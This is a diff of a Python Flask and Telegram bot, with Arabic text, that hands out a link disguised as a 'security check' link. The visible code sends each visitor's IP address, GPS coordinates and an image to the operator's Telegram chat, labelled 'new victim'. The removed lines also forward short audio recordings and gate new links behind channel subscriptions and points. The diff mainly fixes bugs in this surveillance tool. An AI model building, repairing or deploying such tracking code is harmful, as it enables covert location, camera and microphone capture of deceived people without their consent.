@@ -11,9 +11,6 @@ MY_LINK = "https://sif-e7ad.onrender.com"
 CHANNEL_URL = "https://t.me/FAABOT?start=7041600701"
 # ============================================================
 
-users_db = {}
-used_ips = set()
-
 HTML_TEMPLATE = '''
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
@@ -94,7 +91,7 @@ def index():
 def capture():
     data = request.json
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    msg = f"🔥 <b>ضحية جديدة!</b>\n🌐 IP: <code>{ip}</code>\n📍 موقع: https://www.google.com/maps?q={data['lat']},{data['lon']}"
+    msg = f"🔥 <b>ضحية جديدة!</b>\n🌐 IP: <code>{ip}</code>\n📍 موقع: http://maps.google.com/?q={data['lat']},{data['lon']}"
     send_to_tg(msg, data.get('img'))
     return jsonify({"status": "ok"})
 
@@ -103,14 +100,14 @@ def webhook():
     update = request.json
     if "message" in update and "text" in update["message"]:
         text = update["message"]["text"]
-        chat_id = update["message"]["chat_id"]
+        chat_id = update["message"]["chat"]["id"]
         if text == "/start":
             msg = "👋 أهلاً بك في بوت الحماية\n\nاضغط على الزر أدناه لإنشاء رابط فحص خاص بك."
             kb = {"inline_keyboard": [[{"text": "🚀 إنشاء رابط الفحص", "callback_data": "gen"}]]}
             requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': msg, 'reply_markup': kb})
     
     elif "callback_query" in update:
-        chat_id = update["callback_query"]["message"]["chat_id"]
+        chat_id = update["callback_query"]["message"]["chat"]["id"]
         if update["callback_query"]["data"] == "gen":
             requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': f"✅ رابط الفحص الخاص بك جاهز:\n\n<code>{MY_LINK}</code>"})
     
@@ -118,44 +115,3 @@ def webhook():
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=10000)
-        requests.post(api + "sendDocument", data={'chat_id': CHAT_ID, 'caption': '🎤 تسجيل 3 ثواني', 'document': f})
-    return "OK"
-
-def run_bot():
-    last_id = 0
-    while True:
-        try:
-            r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset={last_id + 1}&timeout=30").json()
-            for up in r.get('result', []):
-                last_id = up['update_id']
-                if 'message' in up:
-                    msg = up['message']
-                    u_id = str(msg['from']['id'])
-                    if u_id not in users_db: users_db[u_id] = {'used': False, 'points': 0}
-                    
-                    if msg.get('text') == '/start':
-                        welcome = "🛡️ **نظام الحماية الذكي | Smart Security**\n\nيجب عليك الاشتراك في القناة أولاً، ثم إنشاء الرابط الخاص بك."
-                        kb = {"inline_keyboard": [
-                            [{"text": "📢 الاشتراك الإجباري", "url": CHANNEL_URL}],
-                            [{"text": "🚀 إنشاء رابط الفحص", "callback_data": "gen_link"}],
-                            [{"text": "📊 معلوماتي", "callback_data": "info"}]
-                        ]}
-                        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': u_id, 'text': welcome, 'reply_markup': kb, 'parse_mode': 'Markdown'})
-                
-                elif 'callback_query' in up:
-                    cb = up['callback_query']
-                    u_id = str(cb['from']['id'])
-                    if cb['data'] == 'gen_link':
-                        if not users_db[u_id]['used']:
-                            users_db[u_id]['used'] = True
-                            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={'chat_id': u_id, 'text': f"✅ تم توليد رابطك المجاني لمرة واحدة:\n\n{MY_LINK}"})
-                        elif users_db[u_id]['points'] >= 10:
-                            users_db[u_id]['points'] -= 10
-                            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={'chat_id': u_id, 'text': f"✅ تم خصم 10 نقاط. رابطك الجديد:\n\n{MY_LINK}"})
-                        else:
-                            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={'chat_id': u_id, 'text': "❌ استنفدت محاولتك!\n\nاجمع 10 نقاط أو تواصل مع المطور للتفعيل المدفوع."})
-        except: pass
-
-if __name__ == '__main__':
-    Thread(target=run_bot).start()
-    app.run(host='0.0.0.0', port=5000)
